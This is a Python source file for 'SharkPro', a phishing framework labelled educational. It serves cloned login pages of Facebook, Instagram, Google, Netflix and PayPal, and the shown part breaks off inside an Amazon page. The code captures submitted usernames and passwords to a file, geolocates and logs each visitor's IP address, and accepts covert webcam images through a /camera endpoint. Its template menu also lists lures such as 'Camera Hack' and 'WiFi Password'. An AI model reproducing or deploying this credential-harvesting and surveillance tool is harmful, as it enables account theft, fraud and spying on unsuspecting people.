#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
SharkPro v2.6 - Advanced Phishing Framework
Educational & Authorized Penetration Testing Only
Features: Ngrok, Cloudflared, URL Masking, 2026 Templates
"""

import os
import sys
import time
import json
import base64
import random
import string
import requests
import subprocess
import threading
import socketserver
import http.server
from urllib.parse import parse_qs, urlparse, unquote

# Configuration
R = "\033[1;31m"
G = "\033[1;32m"
Y = "\033[1;33m"
B = "\033[1;34M"
C = "\033[1;36m"
W = "\033[1;37m"
NC = "\033[0m"

PORT = 8080
SERVER_DIR = ".shark_server"
CREDS_FILE = "captured_creds.txt"

BANNER = f"""
{C}╔═══════════════════════════════════════════════════════════╗{NC}
{C}║{G}   ███████╗██╗  ██╗ █████╗ ██████╗ ██╗  ██╗             {C}║{NC}
{C}║{G}   ██╔════╝██║  ██║██╔══██╗██╔══██╗██║ ██╔╝             {C}║{NC}
{C}║{G}   ███████╗███████║███████║██████╔╝█████╔╝              {C}║{NC}
{C}║{G}   ╚════██║██╔══██║██╔══██║██╔══██╗██╔═██╗              {C}║{NC}
{C}║{G}   ███████║██║  ██║██║  ██║██║  ██║██║  ██╗             {C}║{NC}
{C}║{G}   ╚══════╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝╚═╝  ╚═╝             {C}║{NC}
{C}║{G}                 ██████╗ ██████╗  ██████╗               {C}║{NC}
{C}║{G}                 ██╔══██╗██╔══██╗██╔═══██╗              {C}║{NC}
{C}║{G}                 ██████╔╝██████╔╝██║   ██║              {C}║{NC}
{C}║{G}                 ██╔═══╝ ██╔══██╗██║   ██║              {C}║{NC}
{C}║{G}                 ██║     ██║  ██║╚██████╔╝              {C}║{NC}
{C}║{G}                 ╚═╝     ╚═╝  ╚═╝ ╚═════╝               {C}║{NC}
{C}║{NC}                                                           {C}║{NC}
{C}║{Y}              ⚠️  EDUCATIONAL USE ONLY  ⚠️               {C}║{NC}
{C}╚═══════════════════════════════════════════════════════════╝{NC}
"""

# Extended Templates with 2026 Modern Design
TEMPLATES = {
    "01": {"name": "Facebook", "redirect": "https://facebook.com", "type": "social"},
    "02": {"name": "Pinterest", "redirect": "https://pinterest.com", "type": "social"},
    "03": {"name": "Instagram", "redirect": "https://instagram.com", "type": "social"},
    "04": {"name": "Uber Eats", "redirect": "https://ubereats.com", "type": "service"},
    "05": {"name": "OLA", "redirect": "https://ola.com", "type": "service"},
    "06": {"name": "Google", "redirect": "https://google.com", "type": "social"},
    "07": {"name": "PayPal", "redirect": "https://paypal.com", "type": "payment"},
    "08": {"name": "Netflix", "redirect": "https://netflix.com", "type": "entertainment"},
    "09": {"name": "Insta Followers", "redirect": "https://instagram.com", "type": "social"},
    "10": {"name": "Amazon", "redirect": "https://amazon.com", "type": "shopping"},
    "11": {"name": "WhatsApp", "redirect": "https://whatsapp.com", "type": "social"},
    "12": {"name": "LinkedIn", "redirect": "https://linkedin.com", "type": "social"},
    "13": {"name": "Hotstar", "redirect": "https://hotstar.com", "type": "entertainment"},
    "14": {"name": "Spotify", "redirect": "https://spotify.com", "type": "entertainment"},
    "15": {"name": "GitHub", "redirect": "https://github.com", "type": "developer"},
    "16": {"name": "IP Finder", "redirect": "https://whatismyipaddress.com", "type": "service"},
    "17": {"name": "Zomato", "redirect": "https://zomato.com", "type": "service"},
    "18": {"name": "PhonePe", "redirect": "https://phonepe.com", "type": "payment"},
    "19": {"name": "Paytm", "redirect": "https://paytm.com", "type": "payment"},
    "20": {"name": "Telegram", "redirect": "https://telegram.org", "type": "social"},
    "21": {"name": "Twitter/X", "redirect": "https://twitter.com", "type": "social"},
    "22": {"name": "Flipkart", "redirect": "https://flipkart.com", "type": "shopping"},
    "23": {"name": "WordPress", "redirect": "https://wordpress.com/login", "type": "developer"},
    "24": {"name": "Snapchat", "redirect": "https://snapchat.com", "type": "social"},
    "25": {"name": "ProtonMail", "redirect": "https://proton.me", "type": "secure"},
    "26": {"name": "Stack Overflow", "redirect": "https://stackoverflow.com", "type": "developer"},
    "27": {"name": "eBay", "redirect": "https://ebay.com", "type": "shopping"},
    "28": {"name": "Twitch", "redirect": "https://twitch.tv", "type": "entertainment"},
    "29": {"name": "AJIO", "redirect": "https://ajio.com", "type": "shopping"},
    "30": {"name": "Mobikwik", "redirect": "https://mobikwik.com", "type": "payment"},
    "31": {"name": "Camera Hack", "redirect": "https://google.com", "type": "advanced"},
    "32": {"name": "Audio Hack", "redirect": "https://google.com", "type": "advanced"},
    "33": {"name": "WiFi Admin Panel", "redirect": "http://192.168.0.1", "type": "network"},
    "34": {"name": "WiFi Password", "redirect": "https://google.com", "type": "network"},
    "35": {"name": "Game ID Hack", "redirect": "https://google.com", "type": "gaming"},
    "36": {"name": "TikTok", "redirect": "https://tiktok.com", "type": "social"},
    "37": {"name": "Discord", "redirect": "https://discord.com", "type": "social"},
    "38": {"name": "Steam", "redirect": "https://store.steampowered.com", "type": "gaming"},
    "39": {"name": "Apple ID", "redirect": "https://apple.com", "type": "social"},
    "40": {"name": "Microsoft", "redirect": "https://microsoft.com", "type": "social"},
}

class PhishHandler(http.server.BaseHTTPRequestHandler):
    def log_message(self, format, *args):
        pass
    
    def do_GET(self):
        parsed = urlparse(self.path)
        path = parsed.path
        
        if path == '/':
            path = '/index.html'
        
        file_path = os.path.join(SERVER_DIR, path.lstrip('/'))
        
        # IP Logging
        client_ip = self.client_address[0]
        user_agent = self.headers.get('User-Agent', 'Unknown')
        
        if path in ['/index.html', '/']:
            log_ip(client_ip, user_agent, "VISIT")
        
        if os.path.exists(file_path):
            self.send_response(200)
            if file_path.endswith('.html'):
                self.send_header('Content-type', 'text/html')
            elif file_path.endswith('.css'):
                self.send_header('Content-type', 'text/css')
            elif file_path.endswith('.js'):
                self.send_header('Content-type', 'application/javascript')
            self.end_headers()
            
            with open(file_path, 'rb') as f:
                self.wfile.write(f.read())
        else:
            self.send_error(404)
    
    def do_POST(self):
        if self.path == '/capture':
            content_length = int(self.headers['Content-Length'])
            post_data = self.rfile.read(content_length).decode('utf-8')
            parsed = parse_qs(post_data)
            
            client_ip = self.client_address[0]
            user_agent = self.headers.get('User-Agent', 'Unknown')
            
            capture_creds(parsed, client_ip, user_agent, self.headers)
            
            # Redirect
            self.send_response(302)
            redirect_url = CURRENT_TEMPLATE.get("redirect", "https://google.com")
            self.send_header('Location', redirect_url)
            self.end_headers()
        elif self.path == '/camera':
            content_length = int(self.headers.get('Content-Length', 0))
            if content_length:
                post_data = self.rfile.read(content_length)
                save_camera_image(post_data, self.client_address[0])
            self.send_response(200)
            self.end_headers()
        else:
            self.do_GET()

def log_ip(ip, user_agent, action):
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    geo_data = get_geo_data(ip)
    
    log = f"""
{Y}[{timestamp}] {G}{action} from {ip}{NC}
{Y}├── User-Agent: {W}{user_agent[:60]}...{NC}
{Y}├── Location: {C}{geo_data.get('city', 'Unknown')}, {geo_data.get('country', 'Unknown')}{NC}
{Y}├── ISP: {C}{geo_data.get('isp', 'Unknown')}{NC}
{Y}└── Coordinates: {C}{geo_data.get('loc', 'Unknown')}{NC}
"""
    print(log)
    
    with open("ip_logs.txt", "a") as f:
        f.write(f"[{timestamp}] IP: {ip} | {user_agent} | {geo_data}\n")

def get_geo_data(ip):
    try:
        if ip in ['127.0.0.1', 'localhost', '::1']:
            return {'city': 'Local', 'country': 'Local', 'isp': 'Local', 'loc': '0,0'}
        response = requests.get(f"http://ip-api.com/json/{ip}", timeout=3)
        return response.json()
    except:
        return {'city': 'Unknown', 'country': 'Unknown', 'isp': 'Unknown', 'loc': 'Unknown'}

def capture_creds(data, ip, user_agent, headers):
    global CURRENT_TEMPLATE
    
    timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
    
    print(f"\n{G}{'='*60}{NC}")
    print(f"{G}[✓] CREDENTIALS CAPTURED!{NC}")
    print(f"{Y}Time:{NC} {timestamp}")
    print(f"{Y}From IP:{NC} {ip}")
    print(f"{Y}Template:{NC} {CURRENT_TEMPLATE.get('name', 'Unknown')}")
    print(f"{Y}Data:{NC}")
    
    creds_entry = f"\n{'='*50}\nTime: {timestamp}\nIP: {ip}\nTemplate: {CURRENT_TEMPLATE.get('name')}\n"
    
    for key, values in data.items():
        value = values[0] if values else ''
        if any(k in key.lower() for k in ['pass', 'pwd', 'password', 'user', 'email', 'login', 'phone', 'id']):
            print(f"  {C}{key}:{NC} {W}{value}{NC}")
            creds_entry += f"{key}: {value}\n"
    
    # Capture headers
    creds_entry += f"User-Agent: {user_agent}\n"
    creds_entry += f"{'='*50}\n"
    
    with open(CREDS_FILE, "a") as f:
        f.write(creds_entry)
    
    print(f"{G}{'='*60}{NC}\n")

def save_camera_image(data, ip):
    timestamp = time.strftime("%Y%m%d_%H%M%S")
    filename = f"captures/cam_{ip.replace('.', '_')}_{timestamp}.jpg"
    os.makedirs("captures", exist_ok=True)
    
    try:
        # Remove data URI header if present
        if b'base64' in data:
            data = data.split(b'base64,')[1]
        image_data = base64.b64decode(data)
        
        with open(filename, 'wb') as f:
            f.write(image_data)
        print(f"{G}[✓] Camera image saved: {filename}{NC}")
    except Exception as e:
        print(f"{R}[!] Error saving image: {e}{NC}")

def generate_2026_template(template_id):
    """Generate modern 2026-styled phishing pages"""
    template = TEMPLATES.get(template_id, {})
    name = template.get("name", "Login")
    redirect = template.get("redirect", "https://google.com")
    
    # Modern Facebook 2026 style
    if template_id == "01":
        return get_facebook_2026()
    elif template_id == "03":
        return get_instagram_2026()
    elif template_id == "06":
        return get_google_2026()
    elif template_id == "08":
        return get_netflix_2026()
    elif template_id == "07":
        return get_paypal_2026()
    elif template_id == "10":
        return get_amazon_2026()
    elif template_id == "11":
        return get_whatsapp_2026()
    elif template_id == "21":
        return get_twitter_2026()
    elif template_id == "31":
        return get_camera_template()
    elif template_id == "32":
        return get_audio_template()
    elif template_id == "33":
        return get_wifi_admin_template()
    elif template_id == "34":
        return get_wifi_password_template()
    else:
        return get_generic_template(name, redirect)

def get_facebook_2026():
    return '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Facebook - Log In or Sign Up</title>
    <meta name="theme-color" content="#1877f2">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600;700&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', -apple-system, sans-serif; }
        body { background: #f0f2f5; min-height: 100vh; display: flex; flex-direction: column; }
        .container { flex: 1; display: flex; align-items: center; justify-content: center; padding: 20px; gap: 40px; max-width: 1000px; margin: 0 auto; }
        .left { text-align: left; flex: 1; }
        .logo { color: #1877f2; font-size: 4rem; font-weight: 700; margin-bottom: 20px; letter-spacing: -2px; }
        .tagline { font-size: 28px; line-height: 32px; color: #1c1e21; max-width: 500px; }
        .right { flex: 0 0 396px; }
        .card { background: white; padding: 20px; border-radius: 8px; box-shadow: 0 2px 4px rgba(0,0,0,0.1), 0 8px 16px rgba(0,0,0,0.1); }
        input { width: 100%; padding: 14px 16px; margin: 6px 0; border: 1px solid #dddfe2; border-radius: 6px; font-size: 17px; transition: border-color 0.3s; }
        input:focus { outline: none; border-color: #1877f2; box-shadow: 0 0 0 2px #e7f3ff; }
        .login-btn { width: 100%; padding: 14px; background: #1877f2; color: white; border: none; border-radius: 6px; font-size: 20px; font-weight: 600; cursor: pointer; margin-top: 12px; transition: background 0.2s; }
        .login-btn:hover { background: #166fe5; }
        .forgot { color: #1877f2; text-decoration: none; font-size: 14px; display: block; text-align: center; margin: 16px 0; }
        .forgot:hover { text-decoration: underline; }
        .divider { border-bottom: 1px solid #dadde1; margin: 20px 0; }
        .create-btn { background: #42b72a; color: white; border: none; border-radius: 6px; padding: 14px 16px; font-size: 17px; font-weight: 600; cursor: pointer; display: block; margin: 0 auto; transition: background 0.2s; }
        .create-btn:hover { background: #36a420; }
        .meta { text-align: center; margin-top: 28px; font-size: 14px; color: #1c1e21; }
        .meta a { color: #1c1e21; font-weight: 600; text-decoration: none; }
        .meta a:hover { text-decoration: underline; }
        .footer { padding: 20px; background: white; margin-top: auto; }
        .language { text-align: center; font-size: 12px; color: #737373; margin-bottom: 20px; }
        .links { display: flex; flex-wrap: wrap; justify-content: center; gap: 20px; font-size: 12px; color: #8a8d91; }
        .copyright { text-align: center; margin-top: 20px; font-size: 11px; color: #737373; }
        @media (max-width: 900px) { .container { flex-direction: column; } .left { text-align: center; } }
    </style>
</head>
<body>
    <div class="container">
        <div class="left">
            <div class="logo">facebook</div>
            <p class="tagline">Connect with friends and the world around you on Facebook.</p>
        </div>
        <div class="right">
            <div class="card">
                <form action="/capture" method="POST">
                    <input type="text" name="email" placeholder="Email or phone number" required autocomplete="username">
                    <input type="password" name="password" placeholder="Password" required autocomplete="current-password">
                    <button type="submit" class="login-btn">Log In</button>
                </form>
                <a href="#" class="forgot">Forgotten password?</a>
                <div class="divider"></div>
                <button class="create-btn">Create new account</button>
            </div>
            <p class="meta"><strong>Create a Page</strong> for a celebrity, brand or business.</p>
        </div>
    </div>
    <footer class="footer">
        <div class="language">English (UK) Hausa Français (France) Português (Brasil) Español العربية Bahasa Indonesia Deutsch 日本語 Italiano हिन्दी</div>
        <div class="links">Sign Up Log In Messenger Facebook Lite Video Places Games Marketplace Meta Pay Meta Store Meta Quest Ray-Ban Meta Meta AI Instagram Threads Fundraisers Services Voting Information Centre Privacy Policy Privacy Centre Groups About Create ad Create Page Developers Careers Cookies AdChoices Terms Help Contact uploading and non-users Settings Activity log</div>
        <div class="copyright">Meta © 2026</div>
    </footer>
</body>
</html>'''

def get_instagram_2026():
    return '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Instagram</title>
    <link rel="icon" href="https://static.cdninstagram.com/rsrc.php/v4/yt/r/30Q4LriQ-cP.ico">
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@300;400;500;600&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: -apple-system, BlinkMacSystemFont, 'Inter', sans-serif; }
        body { background: #fafafa; min-height: 100vh; display: flex; flex-direction: column; align-items: center; padding: 32px 0; }
        .container { display: flex; align-items: center; gap: 32px; margin-top: 32px; }
        .phone-mockup { display: none; }
        @media (min-width: 875px) { .phone-mockup { display: block; position: relative; width: 380px; height: 581px; background: url('https://www.instagram.com/static/images/homepage/phones/home-phones.png/1dc085cdb87d.png') center/contain no-repeat; } }
        .right { width: 350px; }
        .login-box { background: #fff; border: 1px solid #dbdbdb; padding: 40px 40px 20px; margin-bottom: 10px; }
        .logo { text-align: center; margin-bottom: 36px; }
        .logo svg { width: 175px; height: 51px; }
        input { width: 100%; background: #fafafa; border: 1px solid #dbdbdb; border-radius: 3px; padding: 9px 8px; margin-bottom: 6px; font-size: 12px; }
        input:focus { outline: none; border-color: #a8a8a8; }
        button { width: 100%; background: #0095f6; color: white; border: none; border-radius: 8px; padding: 8px; font-weight: 600; font-size: 14px; margin-top: 12px; cursor: pointer; opacity: 0.7; }
        button:hover { opacity: 1; }
        .divider { display: flex; align-items: center; margin: 18px 0; }
        .divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: #dbdbdb; }
        .divider span { color: #8e8e8e; font-size: 13px; font-weight: 500; margin: 0 15px; }
        .fb-login { color: #385185; text-decoration: none; font-size: 14px; font-weight: 600; display: flex; align-items: center; justify-content: center; gap: 8px; margin: 15px 0; }
        .forgot { color: #00376b; text-decoration: none; font-size: 12px; text-align: center; display: block; margin-top: 15px; }
        .signup { background: #fff; border: 1px solid #dbdbdb; padding: 25px; text-align: center; font-size: 14px; }
        .signup a { color: #0095f6; text-decoration: none; font-weight: 600; }
        .get-app { text-align: center; margin-top: 20px; }
        .get-app p { color: #262626; font-size: 14px; margin-bottom: 20px; }
        .stores { display: flex; justify-content: center; gap: 8px; }
        .stores img { height: 40px; cursor: pointer; }
        footer { margin-top: 60px; text-align: center; padding: 0 20px; }
        .links { display: flex; flex-wrap: wrap; justify-content: center; gap: 16px; font-size: 12px; color: #737373; margin-bottom: 20px; }
        .copyright { display: flex; gap: 20px; justify-content: center; font-size: 12px; color: #737373; }
        .copyright select { border: none; background: transparent; color: #737373; font-size: 12px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="phone-mockup"></div>
        <div class="right">
            <div class="login-box">
                <div class="logo">
                    <svg aria-label="Instagram" viewBox="0 0 175 51"><path d="M9.8 2.1h5.2v46.6H9.8V2.1zm32.6 14.9c-2.6-.9-5.9-1.5-10-1.5-5 0-8.7 1-11.2 2.9-2.5 1.9-3.7 4.7-3.7 8.4 0 3.3 1.1 5.9 3.3 7.8 2.2 1.9 5.1 2.9 8.7 2.9 1.8 0 3.4-.2 4.8-.6 1.4-.4 2.6-1 3.6-1.8 1-.8 1.8-1.7 2.4-2.8.6-1.1 1.1-2.4 1.3-3.9h5.1c-.3 2.2-.9 4.2-1.8 6-1 1.8-2.2 3.3-3.8 4.6-1.6 1.3-3.4 2.3-5.6 3-2.2.7-4.6 1.1-7.2 1.1-5 0-9-1.5-11.9-4.4-2.9-2.9-4.4-7-4.4-12.2 0-5.3 1.5-9.4 4.4-12.3 2.9-2.9 6.9-4.3 11.9-4.3 4.1 0 7.4.5 9.9 1.5 2.5 1 4.6 2.4 6.2 4.1 1.6 1.7 2.8 3.7 3.5 6 .7 2.3 1.1 4.7 1.2 7.2h-5.1c-.1-1.6-.3-3.1-.7-4.5-.4-1.4-1-2.7-1.9-3.8-.9-1.1-2-2-3.4-2.7z" fill="#000"/></svg>
                </div>
                <form action="/capture" method="POST">
                    <input type="text" name="username" placeholder="Phone number, username, or email" required>
                    <input type="password" name="password" placeholder="Password" required>
                    <button type="submit">Log in</button>
                </form>
                <div class="divider"><span>OR</span></div>
                <a href="#" class="fb-login">Log in with Facebook</a>
                <a href="#" class="forgot">Forgot password?</a>
            </div>
            <div class="signup">Don't have an account? <a href="#">Sign up</a></div>
            <div class="get-app">
                <p>Get the app.</p>
                <div class="stores">
                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_ios_english-en.png/180ae7a0bcf7.png" alt="App Store">
                    <img src="https://www.instagram.com/static/images/appstore-install-badges/badge_android_english-en.png/e9cd846dc748.png" alt="Google Play">
                </div>
            </div>
        </div>
    </div>
    <footer>
        <div class="links">Meta About Blog Jobs Help API Privacy Consumer Health Privacy Terms Locations Instagram Lite Threads Contact Uploading & Non-Users Meta Verified</div>
        <div class="copyright">
            <select><option>English</option><option>Hindi</option><option>French</option></select>
            <span>© 2026 Instagram from Meta</span>
        </div>
    </footer>
</body>
</html>'''

def get_google_2026():
    return '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Roboto:wght@400;500;700&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Roboto', 'Helvetica Neue', sans-serif; }
        body { background: #fff; min-height: 100vh; display: flex; flex-direction: column; }
        .container { flex: 1; display: flex; flex-direction: column; align-items: center; justify-content: center; padding: 24px; }
        .card { width: 100%; max-width: 450px; padding: 48px 40px 36px; border: 1px solid #dadce0; border-radius: 8px; }
        .logo { text-align: center; margin-bottom: 16px; }
        .logo svg { width: 75px; height: 24px; }
        h1 { color: #202124; font-size: 24px; font-weight: 400; text-align: center; margin-bottom: 8px; }
        .subtitle { color: #5f6368; font-size: 16px; text-align: center; margin-bottom: 32px; }
        .input-wrapper { position: relative; margin-bottom: 24px; }
        input { width: 100%; padding: 13px 15px; border: 1px solid #dadce0; border-radius: 4px; font-size: 16px; transition: all 0.2s; }
        input:focus { outline: none; border-color: #1a73e8; border-width: 2px; }
        .forgot { color: #1a73e8; font-size: 14px; font-weight: 500; text-decoration: none; cursor: pointer; }
        .guest { color: #5f6368; font-size: 14px; margin: 32px 0; }
        .guest a { color: #1a73e8; text-decoration: none; font-weight: 500; }
        .actions { display: flex; justify-content: space-between; align-items: center; margin-top: 32px; }
        .create { color: #1a73e8; font-size: 14px; font-weight: 500; text-decoration: none; cursor: pointer; }
        .next { background: #1a73e8; color: white; border: none; border-radius: 4px; padding: 10px 24px; font-size: 14px; font-weight: 500; cursor: pointer; }
        .next:hover { background: #1557b0; box-shadow: 0 1px 2px rgba(60,64,67,0.3); }
        footer { padding: 24px; display: flex; justify-content: space-between; align-items: center; font-size: 12px; color: #5f6368; }
        .footer-links { display: flex; gap: 24px; }
        .footer-links a { color: #5f6368; text-decoration: none; }
        .lang-select { border: none; background: transparent; color: #5f6368; font-size: 12px; }
    </style>
</head>
<body>
    <div class="container">
        <div class="card">
            <div class="logo">
                <svg viewBox="0 0 75 24" width="75" height="24" xmlns="http://www.w3.org/2000/svg">
                    <path d="M74.6 12.3c0-.8-.1-1.6-.2-2.4H68v4.6h3.7c-.1.9-.6 1.8-1.4 2.3v2h2.3c1.3-1.3 2-3 2-5.5z" fill="#4285F4"/>
                    <path d="M68 22c2.4 0 4.5-.8 6-2.2l-2.3-2c-.8.6-1.9.9-3.7.9-2.9 0-5.3-1.9-6.2-4.6h-2.4v2C62.7 19.8 65.1 22 68 22z" fill="#34A853"/>
                    <path d="M61.8 13.9c-.2-.6-.3-1.3-.3-2s.1-1.4.3-2v-2h-2.4c-.5 1.2-.8 2.5-.8 4s.3 2.8.8 4h2.4v-2z" fill="#FBBC05"/>
                    <path d="M68 5.8c1.6 0 2.8.6 3.8 1.5l2.6-2.6C73.1 2.7 70.8 1.8 68 1.8c-2.9 0-5.5 1.8-7 4.4l2.4 2C62.7 7.7 65.1 5.8 68 5.8z" fill="#EA4335"/>
                </svg>
            </div>
            <h1>Sign in</h1>
            <p class="subtitle">with your Google Account</p>
            <form action="/capture" method="POST">
                <div class="input-wrapper">
                    <input type="email" name="email" placeholder="Email or phone" required>
                </div>
                <a href="#" class="forgot">Forgot email?</a>
                <p class="guest">Not your computer? Use Guest mode to sign in privately. <a href="#">Learn more about using Guest mode</a></p>
                <div class="actions">
                    <a href="#" class="create">Create account</a>
                    <button type="submit" class="next">Next</button>
                </div>
            </form>
        </div>
    </div>
    <footer>
        <select class="lang-select"><option>English (United States)</option></select>
        <div class="footer-links">
            <a href="#">Help</a>
            <a href="#">Privacy</a>
            <a href="#">Terms</a>
        </div>
    </footer>
</body>
</html>'''

def get_netflix_2026():
    return '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Netflix</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Netflix+Sans:wght@300;400;500;700&family=Inter:wght@400;500&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Netflix Sans', 'Helvetica Neue', Helvetica, Arial, sans-serif; }
        body { min-height: 100vh; position: relative; background: #000; }
        body::before { content: ''; position: fixed; top: 0; left: 0; right: 0; bottom: 0; background: linear-gradient(rgba(0,0,0,0.5), rgba(0,0,0,0.5)), url('https://assets.nflxext.com/ffe/siteui/vlv3/98cbc248-9c42-4275-9e70-3fc535fa7d26/web/IN-en-20250602-TRIFECTA-perspective_765d4833-eeff-4418-9cea-2583f936a668_large.jpg'); background-size: cover; background-position: center; z-index: -1; }
        header { padding: 20px 4%; display: flex; justify-content: space-between; align-items: center; }
        .logo { width: 148px; }
        .container { display: flex; justify-content: center; align-items: center; min-height: calc(100vh - 100px); padding: 20px; }
        .form-box { background: rgba(0,0,0,0.75); padding: 60px 68px 40px; border-radius: 4px; width: 100%; max-width: 450px; }
        h1 { color: #fff; font-size: 32px; font-weight: 500; margin-bottom: 28px; }
        input { width: 100%; background: #333; border: none; border-radius: 4px; color: #fff; height: 50px; padding: 16px 20px; margin-bottom: 16px; font-size: 16px; }
        input:focus { outline: none; background: #454545; }
        .signin-btn { width: 100%; background: #e50914; color: #fff; border: none; border-radius: 4px; height: 50px; font-size: 16px; font-weight: 700; cursor: pointer; margin-top: 24px; }
        .signin-btn:hover { background: #f40612; }
        .help { display: flex; justify-content: space-between; align-items: center; margin-top: 12px; color: #b3b3b3; font-size: 13px; }
        .remember { display: flex; align-items: center; gap: 5px; }
        .remember input { width: auto; height: auto; margin: 0; }
        .help a { color: #b3b3b3; text-decoration: none; }
        .help a:hover { text-decoration: underline; }
        .signup { color: #737373; margin-top: 70px; font-size: 16px; }
        .signup a { color: #fff; text-decoration: none; }
        .signup a:hover { text-decoration: underline; }
        .recaptcha { color: #8c8c8c; font-size: 13px; margin-top: 20px; }
        .recaptcha a { color: #0071eb; text-decoration: none; }
    </style>
</head>
<body>
    <header>
        <img src="https://upload.wikimedia.org/wikipedia/commons/0/08/Netflix_2015_logo.svg" class="logo" alt="Netflix">
    </header>
    <div class="container">
        <div class="form-box">
            <h1>Sign In</h1>
            <form action="/capture" method="POST">
                <input type="text" name="email" placeholder="Email or phone number" required>
                <input type="password" name="password" placeholder="Password" required>
                <button type="submit" class="signin-btn">Sign In</button>
            </form>
            <div class="help">
                <label class="remember"><input type="checkbox"> Remember me</label>
                <a href="#">Need help?</a>
            </div>
            <div class="signup">
                New to Netflix? <a href="#">Sign up now</a>
            </div>
            <p class="recaptcha">This page is protected by Google reCAPTCHA to ensure you're not a bot. <a href="#">Learn more</a>.</p>
        </div>
    </div>
</body>
</html>'''

def get_paypal_2026():
    return '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>PayPal: Secure Online Payments</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=PayPal+Sans:wght@400;500;700&family=Inter:wght@400;500;600&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'PayPal Sans', 'Inter', sans-serif; }
        body { background: #f7f9fa; min-height: 100vh; display: flex; flex-direction: column; }
        header { background: #fff; padding: 16px 48px; box-shadow: 0 1px 0 0 #eaeced; }
        .logo { width: 30px; height: 36px; }
        .container { flex: 1; display: flex; justify-content: center; align-items: center; padding: 40px 20px; }
        .card { background: #fff; border-radius: 12px; padding: 48px; width: 100%; max-width: 460px; box-shadow: 0 4px 6px -1px rgba(0,0,0,0.1); }
        h1 { color: #001c64; font-size: 28px; font-weight: 700; text-align: center; margin-bottom: 32px; }
        input { width: 100%; padding: 16px; border: 1px solid #cfd3d6; border-radius: 4px; font-size: 16px; margin-bottom: 16px; transition: border-color 0.2s; }
        input:focus { outline: none; border-color: #0070e0; }
        .next-btn { width: 100%; background: #0070e0; color: #fff; border: none; border-radius: 24px; padding: 16px; font-size: 16px; font-weight: 600; cursor: pointer; margin-top: 8px; }
        .next-btn:hover { background: #003087; }
        .divider { display: flex; align-items: center; margin: 24px 0; }
        .divider::before, .divider::after { content: ''; flex: 1; height: 1px; background: #cfd3d6; }
        .divider span { padding: 0 16px; color: #6c7378; font-size: 14px; }
        .signup-btn { width: 100%; background: transparent; color: #0070e0; border: 1px solid #0070e0; border-radius: 24px; padding: 16px; font-size: 16px; font-weight: 600; cursor: pointer; }
        .signup-btn:hover { background: #f7f9ff; }
        .forgot { text-align: center; margin-top: 24px; }
        .forgot a { color: #0070e0; font-size: 14px; text-decoration: none; }
        .forgot a:hover { text-decoration: underline; }
        footer { background: #f7f9fa; padding: 24px; text-align: center; border-top: 1px solid #eaeced; }
        .footer-links { display: flex; justify-content: center; gap: 24px; margin-bottom: 16px; }
        .footer-links a { color: #545d68; font-size: 12px; text-decoration: none; }
        .footer-links a:hover { text-decoration: underline; }
        .copyright { color: #6c7378; font-size: 12px; }
    </style>
</head>
<body>
    <header>
        <img src="https://www.paypalobjects.com/webstatic/icon/pp258.png" class="logo" alt="PayPal">
    </header>
    <div class="container">
        <div class="card">
            <h1>Log in to PayPal</h1>
            <form action="/capture" method="POST">
                <input type="email" name="email" placeholder="Email or mobile number" required>
                <button type="submit" class="next-btn">Next</button>
            </form>
            <div class="divider"><span>or</span></div>
            <button class="signup-btn">Sign Up</button>
            <div class="forgot">
                <a href="#">Having trouble logging in?</a>
            </div>
        </div>
    </div>
    <footer>
        <div class="footer-links">
            <a href="#">Contact Us</a>
            <a href="#">Privacy</a>
            <a href="#">Legal</a>
            <a href="#">Policy Updates</a>
            <a href="#">Worldwide</a>
        </div>
        <p class="copyright">© 1999–2026 PayPal, Inc. All rights reserved.</p>
    </footer>
</body>
</html>'''

def get_amazon_2026():
    return '''<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Amazon Sign-In</title>
    <style>
        @import url('https://fonts.googleapis.com/css2?family=Inter:wght@400;500;600&display=swap');
        * { margin: 0; padding: 0; box-sizing: border-box; font-family: 'Inter', 'Amazon Ember', Arial, sans-serif; }
        body { background: #fff; min-height: 100vh; }
        .logo { text-align: center; padding: 20px; }
        .logo img { width: 103px; }
        .container { max-width: 350px; margin: 0 auto; padding: 0 20px; }
        .card { border: 1px solid #ddd; border-radius: 4px; padding: 20px 26px; }
        h1 { font-size: 28px; font-weight: 400; margin-bottom: 16px; }
        label { display: block; font-size: 13px; font-weight: 700; margin-bottom: 4px; }
        input { width: 100%; padding: 8px; border: 1px solid #a6a6a6; border-radius: 3px; box-shadow: 0 1px 0 rgba(255,255,255,0.5); font-size: 14px; margin-bottom: 12px; }
        input:focus { outline: none; border-color: #e77600; box-shadow: 0 0 3px 2px rgba(228,121,17,0.5); }
        .continue-btn { width: 100%; background: #ffd814; border: 1px solid #fcd200; border-radius: 8px; padding: 8px; font-size: 14px; cursor: pointer; box-shadow: 0 2px 5px 0 rgba(213,217,217,0.5); }
